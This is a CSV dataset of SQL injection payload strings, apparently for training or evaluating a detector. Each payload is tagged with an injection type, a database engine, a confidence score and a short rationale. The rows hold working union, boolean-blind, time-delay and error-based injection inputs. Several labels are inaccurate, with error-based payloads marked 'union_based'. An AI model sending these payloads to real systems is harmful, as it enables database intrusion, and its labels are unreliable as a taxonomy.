id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24458,"-1630' union all select 1971,1971--",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
24460,"-6436' in boolean mode ) union all select 7589,7589,7589,7589--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
24465,"1' ) ) union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
24472,-6764' ) or 2314 = 2017--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
24478,"-8005"" ) union all select 5213,5213,5213,5213,5213--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
24480,"-2168"" ) ) union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
24483,"-5672' ) ) union all select 9371,9371,9371,9371,9371,9371--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
24488,"-8178 ) union all select 4163,4163,4163,4163,4163,4163,4163--",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
24489,"-5832"" ) or 1650 = 9011--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
24490,"-3282' ) union all select 9002,9002,9002,9002,9002#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
24492,"-1134"" union all select 4865,4865,4865,4865,4865#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
24493,"-1908"" ) ) union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
24495,"-4408"" ) or 6872 = 6872 and ( ""oenu"" = ""oenu",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2
24500,"-1920' ) ) ) union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
24502,-9711'+ ( select 'ckpj' where 8338 = 8338 union all select 8338--,union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
24504,"-8301' ) union all select 1806,1806--",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
24510,1 ) ) as fpej where 6790 = 6790 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,2
24512,"1%"" union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
24516,"-1585%"" ) ) union all select 8818,8818,8818,8818,8818,8818#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
24520,-8615 ) ) ) or 4039 = 9144,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
24525,"1 ) ) ) union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
24528,"1%"" union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
24532,-6178 ) ) as lygb where 9559 = 9559 or ( 8459 = 8459 ) *4906--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,2
24539,1 where 4003 = 4003 union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
24543,"1 ) as cfnz where 6065 = 6065 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 92 chars.,2
24546,"1'|| ( select 'akye' where 9242 = 9242 union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 86 chars.,2
24547,"1"" where 2235 = 2235 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
24554,"-2987"" ) as iyob where 7827 = 7827 or ( 8459 = 8459 ) *4906--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 61 chars.,2
24555,"-6368 ) ) union all select 4646,4646,4646,4646,4646,4646,4646--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
24556,-6947' ) ) as qqjp where 6700 = 6700 union all select 6700#,union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
24557,-2604 ) ) as sekb where 6897 = 6897 or 1000 = 7683,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
24558,"1"" union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
24560,-2751 where 6334 = 6334 or ( 9668 = 5845 ) *5845--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
24566,-3246%' union all select 4012#,union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
24572,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
24585,"-8982'+ ( select anyd where 5358 = 5358 union all select 5358,5358,5358,5358,5358,5358#",union_based,generic,0.7,UNION-based payload detected. Payload length: 87 chars.,2
24587,"1"" ) ) union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
24588,"-2263' ) where 7931 = 7931 union all select 7931,7931,7931--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
24589,-5585%' ) ) ) or 6990 = 7727,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
24596,"-5998"" ) as gazd where 2814 = 2814 union all select 2814,2814,2814,2814,2814,2814,2814--",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
24599,1%' ) ) and 7160 = 7249--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
24401,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 9348 = 9348",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24405,"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ""cecf"" = ""cecf",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24424,"1"" ) as bllz where 6975 = 6975 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24426,"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and 'cotv' like 'cotv",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24449,"1%"" ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""%"" = """,boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24494,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and 'hmqd' = 'hmqd",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24506,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'jxqf' like 'jxqf",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24511,"1%"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24540,"1"" ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24550,"1 where 2146 = 2146 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24551,"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # qmkh",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24565,"1%' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( '%' = '",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
24573,"1' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'qgdv' = 'qgdv",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24578,"1%"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ""%"" = """,boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24579,"1' where 7504 = 7504 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24595,"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'beoh' = 'beoh",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
24402,"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24420,"1"" ) as cnrh where 8524 = 8524 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24421,1 or sleep ( 5 ) -- nrzf,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24433,1' ) ) ) and sleep ( 5 ) and ( ( ( 'lbmp' = 'lbmp,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24445,1%' ) ) ) or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24468,1 ) as afmb where 8665 = 8665 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 41 chars.,1
24471,"1"" and elt ( 4594 = 1040,1040 )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
24486,"1"" ) as ucex where 5148 = 5148 order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 42 chars.,1
24507,1' ) ) ) or sleep ( 5 ) and ( ( ( 'bmnf' like 'bmnf,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24515,"1' ) and elt ( 4249 = 4249,7259 ) and ( 'bxnn' = 'bxnn",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
24521,1 ) ) as beld where 1679 = 1679 or sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24598,1' and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24416,"1 ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( 3036 = 3036",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 63 chars.,1
24439,end and ( ( ( 'xzbk' = 'xzbk,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1
24513,1' and ( 5116 = 1602 ) *1602,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1
24531,-6145 or ( 8459 = 8459 ) *4906-- yklv,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,1
24549,-6086' ) ) or ( 6719 = 7280 ) *7280 and ( ( 'ozbj' = 'ozbj,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 58 chars.,1
24594,end and 'wdce' = 'wdce,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,1
24408,1' ) as wtev where 5283 = 5283,benign,generic,0.5,. Payload length: 30 chars.,1
24411,1' where 6533 = 6533,benign,generic,0.5,. Payload length: 20 chars.,1
24418,"1"" ) as uorp where 7208 = 7208",benign,generic,0.5,. Payload length: 30 chars.,1
24462,"1"" where 3318 = 3318",benign,generic,0.5,. Payload length: 20 chars.,1
24467,1' ) as jwch where 4609 = 4609,benign,generic,0.5,. Payload length: 30 chars.,1
24473,1 ) as iiku where 9466 = 9466,benign,generic,0.5,. Payload length: 29 chars.,1
24481,"1"" ) where 6903 = 6903",benign,generic,0.5,. Payload length: 22 chars.,1
24497,1' ) as wvvo where 4288 = 4288,benign,generic,0.5,. Payload length: 30 chars.,1
24503,1 ) ) as vmwj where 5597 = 5597,benign,generic,0.5,. Payload length: 31 chars.,1
24505,1' ) as sruz where 6318 = 6318,benign,generic,0.5,. Payload length: 30 chars.,1
24533,"1"" ) as ikdo where 4128 = 4128",benign,generic,0.5,. Payload length: 30 chars.,1
24534,1 ) where 6150 = 6150,benign,generic,0.5,. Payload length: 21 chars.,1
24537,1' where 6409 = 6409,benign,generic,0.5,. Payload length: 20 chars.,1
24571,"1"" where 9461 = 9461",benign,generic,0.5,. Payload length: 20 chars.,1
24576,1 where 6173 = 6173,benign,generic,0.5,. Payload length: 19 chars.,1
24582,"1"" ) as eomu where 6599 = 6599",benign,generic,0.5,. Payload length: 30 chars.,1
24400,-2920' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'rzey' = 'rzey,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
24403,"1'+ ( select tvpj where 7058 = 7058 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
24404,"1"" and elt ( 1210 = 1210,sleep ( 5 ) ) and ""phcl"" like ""phcl",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
24407,1 ) ) as jvoo where 5116 = 5116 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
24409,1 where 5359 = 5359 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
24410,"1'+ ( select qymy where 8657 = 8657 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
24412,"1"" ) as mwja where 7881 = 7881 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
24413,"1'|| ( select 'fraa' from dual where 9140 = 9140 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ) ||'",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'dual'; UNION-based payload detected; DB: mysql",0
24419,"1%' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( '%' = '",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
24425,"-6970"" ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""dyrq"" like ""dyrq",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
24429,-2992%' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( '%' = ',union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
24432,"1"" where 9342 = 9342 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
24435,"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
24438,1 ) ) as iihk where 5414 = 5414 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
24442,1' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'qtul' like 'qtul,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
24443,"( extractvalue ( 1759,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1759 = 1759,1 ) ) ) ,0x717a767a71 ) ) )",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
24448,-5769 ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
24450,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",union_based,sqlite,1.0,"Signals: 'randomblob', 'hex'; UNION-based payload detected; DB: sqlite",0
24451,"-5526 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
24452,"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""endx"" = ""endx",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
24457,1' rlike ( select ( case when ( 1916 = 7874 ) then 1 else 0x28 end ) ) and 'ughq' = 'ughq,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
24459,"1 ) as mwcs where 2544 = 2544 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
24461,1'+ ( select 'ozpm' where 6939 = 6939 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) +',union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
24464,"1 ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
24466,"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'fvbv' = 'fvbv",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
24470,1' ) where 2511 = 2511 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
24474,1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
24475,-9847%' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( '%' = ',union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
24479,"1' in boolean mode ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) #",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
24482,"1'|| ( select 'asfl' from dual where 5846 = 5846 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",union_based,oracle,1.0,"Signals: 'dbms_pipe', 'chr', 'dual'; UNION-based payload detected; DB: oracle",0
24484,"1' where 4102 = 4102 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
